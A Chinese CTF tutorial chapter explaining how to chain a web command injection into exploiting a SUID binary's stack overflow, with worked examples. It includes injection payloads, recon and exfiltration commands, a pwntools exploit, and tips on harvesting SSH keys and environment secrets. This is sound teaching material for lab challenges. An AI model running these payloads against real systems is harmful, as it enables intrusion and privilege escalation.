---
comments: true
---

# Web与二进制结合

在 CTF 比赛中，有一类题目会把 Web 安全和二进制（Pwn）结合起来考察：你在 Web 页面里找到的漏洞只是入场券，真正的 flag 藏在后端的二进制程序里。这类题考察的是「打通链路」的能力——先通过 Web 漏洞拿到立足点，再利用收集到的信息攻击二进制组件。本章讲解这类题的常见形态、信息衔接思路和一套完整的组合拳。

## 这类题的常见形态

Web 与二进制结合的题目，通常具有一个共同点：**Web 应用只是一个入口，核心逻辑或 flag 由一个二进制组件承载**。常见的形态有以下几种。

### 形态一：Web 入口 → 内部服务是二进制组件

最典型的架构是：

```text
[选手] --HTTP--> [Web 服务 (Nginx/PHP/Flask)] --本地协议--> [二进制服务 (ELF)]
                                                              │
                                                          flag 在这里
```

Web 服务负责接收请求、做简单的参数处理，然后把数据转发给同一台机器（或同一容器）上监听的二进制服务。二进制服务可能是：

- 一个监听在 `127.0.0.1:xxxx` 的 TCP 服务（比如 C 写的网络程序）；
- 一个由 Web 通过 `popen` / `system` / 进程间通信调用的命令行工具；
- 一个通过 FastCGI、Unix Socket 暴露的后端程序。

攻击思路：先在 Web 层找到 RCE、命令注入或任意文件读取（见本书「RCE」「任意文件读取」章节），拿到立足点后再去分析并攻击二进制服务。

### 形态二：需要服务漏洞利用

立足点拿到后，直接读不到 flag——flag 文件权限是 `400` 且属于 root，或者 flag 只在二进制服务的内存里。这时就需要对二进制服务做经典的 Pwn 攻击：栈溢出、格式化字符串、堆利用等。

```bash
# 立足点后常见的情形：flag 读不了
www-data@target:~$ cat /flag
cat: /flag: Permission denied
www-data@target:~$ ls -l /flag
-r-------- 1 root root 36 Jun  1 10:00 /flag
```

### 形态三：需要提权打通链路

有些题目里二进制服务本身没有漏洞，或者漏洞利用后拿到的仍是低权限 shell，最后一步是 Linux 提权（SUID 滥用、内核漏洞、sudo 配置错误等）。这类题本质上是「Web 立足点 + 本地提权」，二进制部分可能只是最后执行 `getflag` 之类的 SUID 程序。

**做题时的判断流程**：拿到 Web 立足点后，先问自己三个问题：

1. flag 现在能直接读到吗？能就结束，不能就下一步；
2. 目标机器上有没有二进制服务在监听（`ss -tlnp`）或可疑的 ELF 文件？
3. 有没有 SUID 程序、sudo 权限、高版本内核等提权线索？

## 信息衔接：Web 层的信息如何指导二进制利用

Web 层拿到立足点之前和之后，你收集到的每一条信息都可能是二进制利用的关键拼图。衔接的核心思路是：**Web 层负责「侦察」，二进制层负责「攻坚」**。

### 版本信息

- Web 层的报错页面、`Server` 响应头、`phpinfo()` 泄露的路径，可能暴露操作系统发行版（如 `Ubuntu 20.04`），这直接决定了 libc 版本和内核版本。
- 如果能下载到目标二进制文件（通过任意文件读取或源码泄露），在本地用 `checksec` 分析保护机制：

```bash
$ checksec --file=./pwn_server
[*] '/home/ctf/pwn_server'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE 意味着地址固定，ret2text/ret2libc 的地址不需要泄漏；有 Canary 则需要先想办法泄漏 Canary 值。

### 配置信息

- Web 应用的配置文件（如 `config.php`、`.env`）里常有内部服务的监听地址、端口和通信协议格式——这正是你构造二进制交互的说明书。
- 通过 Web 的文件读取漏洞读 `/proc/net/tcp`、`/etc/supervisord.conf`、`docker-compose.yml` 等，可以摸清内部服务拓扑。

### 凭据与密钥

- 配置文件里的数据库密码、API Token，可能同时也是二进制服务的鉴权口令，或者 su 提权用的密码。
- 读到的 SSH 私钥（`/home/*/.ssh/id_rsa`）可能让你直接从低权限 Web shell 换成功能完整的用户 shell，方便做本地调试。

### 一条原则

不要急着对着二进制硬刚。先在 Web 层把能读的文件都读了：源码、配置、`/proc`、环境变量（`/proc/self/environ`）。很多 Web+Pwn 题的难度其实不在 Pwn 本身，而在于你能否从 Web 层拿到「二进制程序的源码或协议格式」这块拼图。

## 常见组合拳示例：从 Web 立足点到拿下 flag

下面给出一套最典型的完整链路推演：**Web RCE → 容器内立足点 → 攻击本地 SUID 程序 / 内部服务端口**。

### 场景设定

- 目标是一个 PHP 站点，存在命令注入漏洞；
- 容器内有一个 SUID 的 ELF 程序 `/usr/local/bin/readflag`，只有它能读 `/flag`；
- `readflag` 存在栈溢出漏洞。

### 第一步：Web 层拿到命令执行

假设站点有个 ping 功能，参数直接拼接进 `system()`（这类漏洞的详细原理见本书「RCE」章节）：

```bash
curl 'http://target/ping.php?ip=127.0.0.1;id'
```

返回中出现 `uid=33(www-data) gid=33(www-data)`，确认拿到 `www-data` 权限的命令执行。

### 第二步：侦察容器内部

通过命令注入逐个执行侦察命令：

```bash
# 查看本机监听端口，找内部服务
ip=127.0.0.1;ss -tlnp

# 查找 SUID 程序
ip=127.0.0.1;find / -perm -4000 -type f 2>/dev/null

# 确认 flag 权限
ip=127.0.0.1;ls -l /flag
```

发现 `/usr/local/bin/readflag` 带 SUID 位且属于 root：

```text
-rwsr-xr-x 1 root root 16632 Jun  1 10:00 /usr/local/bin/readflag
```

### 第三步：下载二进制到本地分析

用命令注入把文件传出来（例如 base64 编码后回显）：

```bash
curl 'http://target/ping.php?ip=127.0.0.1;base64 /usr/local/bin/readflag' -o leak.html
# 从返回中提取 base64 内容并解码
base64 -d leak.b64 > readflag
chmod +x readflag
checksec --file=readflag
```

本地反汇编（`objdump -d`、Ghidra 或 IDA）发现 `main` 函数里：

```c
void vuln(void) {
    char buf[64];
    puts("input:");
    gets(buf);            // 栈溢出，无长度检查
    if (check_token()) {  // 需要绕过或直接覆盖返回地址
        system("cat /flag");
    }
}
```

程序里本身有 `system("cat /flag")` 的逻辑，但被一个永远失败的检查挡住。思路：利用 `gets` 溢出覆盖返回地址，直接跳到 `system("cat /flag")` 的地址。No PIE，地址固定，不需要泄漏。

### 第四步：本地写好 exploit，再回传执行

本地用 pwntools 写好 exp 并验证：

```python
from pwn import *

context.binary = elf = ELF('./readflag')

# 通过调试确定偏移：buf 到返回地址 64+8=72 字节
offset = 72
cat_flag_addr = elf.symbols['call_flag']  # 假设存在该函数，或直接填 system("cat /flag") 的地址

p = process('./readflag')
p.sendlineafter(b'input:', b'A' * offset + p64(cat_flag_addr))
p.interactive()
```

本地能弹出 flag 后，把 exp 改造成在目标容器内执行。简单题目中可以直接在命令注入里一行搞定：

```bash
# 用 python 在目标上直接生成 payload 并管道喂给程序
ip=127.0.0.1;python3 -c "print('A'*72 + '\x40\x12\x36\x40\x00\x00\x00\x00')" | /usr/local/bin/readflag
```

注意字节序：x86-64 小端序，地址 `0x40123640` 这类值要按小端写入，且 payload 中不能包含会被 shell 或 PHP 过滤的字符——必要时用 `python3 -c` 生成或 base64 解码：

```bash
ip=127.0.0.1;echo 'QUFB...' | base64 -d | /usr/local/bin/readflag
```

### 链路总结

```text
命令注入 (Web) → www-data 立足点 → 侦察发现 SUID 程序
    → 下载分析 → 本地编写/调通 exploit → 通过 Web 通道投递执行 → flag
```

这套链路的每一环单独看都不难，难在把各环节的信息串起来。实战中常见的变体还有：立足点后攻击监听在 `127.0.0.1` 的内部 TCP 服务（用 `curl`/`nc` 或端口转发把服务暴露出来再打）、利用内核版本漏洞提权（`uname -a` 查版本后找对应 exp）等。

## 需要前置的 Pwn 基础

本章只讲「Web 与二进制如何衔接」，不展开二进制利用本身的技术细节。如果你在组合拳的第三步、第四步感到吃力，需要补的前置知识在本书 Pwn 部分：

- **栈溢出与返回地址覆盖**：ret2text、ret2libc 的基本原理；
- **保护机制**：Canary、NX、PIE、RELRO 的含义与绕过思路；
- **工具链**：pwntools 的基本用法（`ELF`、`process`、`remote`、`p64/u64`）、GDB 调试；
- **格式化字符串与堆利用**：遇到更复杂的内部服务时需要。

「够用即止」的标准：能看懂 `checksec` 输出、能算出溢出偏移、能写出一个 ret2text 的 exp，就足以应付大多数入门级的 Web+Pwn 综合题。更深入的内容请前往本书 Pwn 章节系统学习。

## 例题推演

下面以一道典型的入门综合题为例（模拟题，架构取自真实比赛常见模式），演示完整解题过程。

### 题目描述

> 某站点是一个 Flask 写的「命令执行面板」，提示「flag 在 root 手里」。开放端口 80。

### 解题过程

**1. 信息收集**

访问站点，页面提供一个「执行系统命令」的输入框，输入 `id` 返回 `uid=33(www-data)`。典型的直接命令执行，没有任何过滤。

先看一圈环境：

```bash
# 通过页面的命令执行框依次提交
ls -l /
cat /flag
```

`cat /flag` 返回 `Permission denied`，`ls -l /` 显示：

```text
-r-------- 1 root root   38 Jun  1 09:00 flag
-rwsr-x--- 1 root www-data 17K Jun  1 09:00 getflag
```

关键点：`getflag` 是 SUID 程序，属主 root，且属组 `www-data` 可执行——也就是说我们当前的 `www-data` 身份恰好有权运行它，运行时会以 root 身份执行。

**2. 分析 getflag**

把程序拉回来：

```bash
# 在命令执行框中
base64 /getflag
```

解码后 `checksec`：No PIE、NX enabled、无 Canary。`objdump -d getflag` 看到逻辑：

- 程序从 `argv[1]` 读入一个「口令」；
- 口令与硬编码字符串比较，相等则 `system("cat /flag")`；
- 比较函数是自己写的 `check()`，内部用 `strcpy` 把 `argv[1]` 拷到 32 字节栈缓冲区——存在栈溢出。

**3. 选择攻击路径**

有两条路：

- 路径 A：逆向出硬编码口令，直接作为参数传入。`strings getflag` 或看反汇编里 `strcmp` 附近的常量，发现口令是 `s3cret_token`，直接 `/getflag s3cret_token` 即可。
- 路径 B：假设口令被混淆处理，利用 `strcpy` 溢出覆盖返回地址跳到 `system("cat /flag")` 处。

本题路径 A 直接成功。在命令执行框提交：

```bash
/getflag s3cret_token
```

页面返回 flag。

**4. 如果口令不可得（路径 B 演示）**

偏移计算：`check()` 中缓冲区 32 字节 + 保存的 rbp 8 字节 = 40 字节覆盖返回地址。通过 `objdump` 找到 `system("cat /flag")` 所在代码块地址 `0x4011f6`。由于参数经过 Web 传递、可能吞掉特殊字符，用 Python 在目标上生成：

```bash
python3 -c "import subprocess; subprocess.run(['/getflag', b'A'*40 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'])"
```

**5. 复盘**

本题的链路是：

```text
Web 命令执行（无过滤）→ www-data
    → 侦察发现 SUID + 属组可执行的 getflag
    → 下载逆向（strings / objdump）
    → 口令比较 or 栈溢出 → root 权限 cat flag
```

值得记住的两点经验：

- SUID 程序的属组权限经常是出题人留的「刚刚好」的口子：`rwsr-x---` 且属组为 `www-data`，明示了从 Web 打过来的预期路径；
- 能逆向出逻辑就别写溢出——Web 通道传二进制 payload 容易踩字符过滤的坑，简单路径优先。

## 小结

- Web+Pwn 题的核心是链路：Web 漏洞负责入场，二进制利用负责拿 flag；
- Web 层收集的版本、配置、凭据信息，直接决定二进制攻击的方案；
- 典型组合拳：RCE 立足 → 侦察（SUID / 内部端口 / 内核版本）→ 下载分析 → 本地调通 exp → 回传执行；
- 二进制利用本身的技术请前往本书 Pwn 部分学习，入门题够用即止。
